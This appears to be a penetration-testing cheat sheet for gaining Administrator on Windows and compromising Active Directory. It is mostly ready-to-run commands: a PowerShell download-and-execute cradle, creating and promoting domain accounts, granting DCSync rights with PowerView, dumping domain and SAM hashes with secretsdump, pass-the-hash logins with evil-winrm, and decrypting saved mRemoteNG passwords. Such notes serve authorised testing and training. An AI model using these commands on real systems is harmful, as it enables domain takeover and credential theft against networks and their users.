# Windows
Everything to check for when trying to become Administrator on Windows

# Directories to check
```bash
# Temporary folder
C:\Windows\System32\spool\drivers\color

# See any suspicious apps 
"C:\Program Files" or "C:\Program Files (x86)"

# Apps on old windows versions
C:\Data\Users\app

# Code policies and passwords in files
C:\program files\windowspowershell\modules\packagemanagement
```

# Commands
## Basic
**Show drives**
```powershell
powershell -c get-psdrive -psprovider filesystem
```
**Show hidden data streams**
```powershell
dir /R
```
**Download files**
```powershell
iex(new-object net.webclient).downloadstring('URL/FILENAME')
```

## User related
**Account creation**
```powershell
# Create account
net user <username> <password> /add

# Create account (AD)
# This will force the command to execute on the domain controller instead of the local computer
net user <username> <password> /add /domain
```

**Group related (DC only)**
```powershell
# Show groups
net group

# Add user to group
net group <groupname> /add <username>
```

### PowerView
**Make credentials**
```powershell
# Set password
$SecPassword = ConvertTo-SecureString <password> -AsPlainText -Force

# Convert password and username into credentials object
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 
```

**Give user DCSync rights**
```powershell
# Set password
$SecPassword = ConvertTo-SecureString <password> -AsPlainText -Force

# Convert password and username into credentials object
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 

# Give user DCSync rights
Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalIdentity <user> -Rights DCSync
```
### References
- [Powerview and PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

# Active Directory
## BloodHound and SharpHound
This is used to visualise AD environments and discover attack paths.

### Useful info
- [https://bloodhound.readthedocs.io/en/latest/index.html](https://bloodhound.readthedocs.io/en/latest/index.html)
- [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
- [https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)

## Evil-WinRM
Allows remote login to WinRM, if credentials are known.

### Usage
```bash
# With password
evil-winrm -i <ip> -u <user> -p <password>

# With Pass The Hash (NTLM)
evil-winrm -i <ip> -u <user> -H <hash>
```
#### References
- [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)


## Impacket tools
### secretsdump.py
Helps to enumerate and dump AD hashes

#### References & link to the tool
- [https://github.com/fortra/impacket/blob/master/examples/secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)


## Misconfigurations
### DCSync
DCSync is a technique used to extract credentials from the Domain Controllers.    
In this we mimic a Domain Controller and leverage the (MS-DRSR) protocol and request for replication using GetNCChanges function.

#### Add rights DCSync rights
```powershell
# Set password
$SecPassword = ConvertTo-SecureString <password> -AsPlainText -Force

# Convert password and username into credentials object
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 

# Give user DCSync rights
Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalIdentity <user> -Rights DCSync
```
#### Get hashes (after user is added to the group)
```bash
secretsdump.py  dc.local/<user>:<password>@<ipaddress> -outputfile hashes
```

# Config files
Most config files can be found in `C:\Windows\System32\config`     

## Get info from registry hive
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

# Mount windows shares and VHD files
The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
```bash
mount -t cifs //<ip>/<share> <mount_dir> -o user=<username>,password=<password>
```

## Mount VHD files
One can use `guestmount` to mount a guest filesystem on the host.     
Install with: `apt install libguestfs-tools`

```bash
guestmount --add <vhd_file> --inspector --ro <mount_dir>
```

### References
- [https://linux.die.net/man/1/guestmount](https://linux.die.net/man/1/guestmount)


# Softwares
## mRemoteNG
mRemoteNG is a remote connection management tool, and it allows the user to save passwords for various types of connections. There is a file in the user's AppData directory, confCons.xml, that holds that information:

### confCons.xml
One can use `mremoteng-decrypt` to crack the password from the config file.     
```bash
python3 mremoteng_decrypt.py -s <string>
```

[https://github.com/kmahyyg/mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)
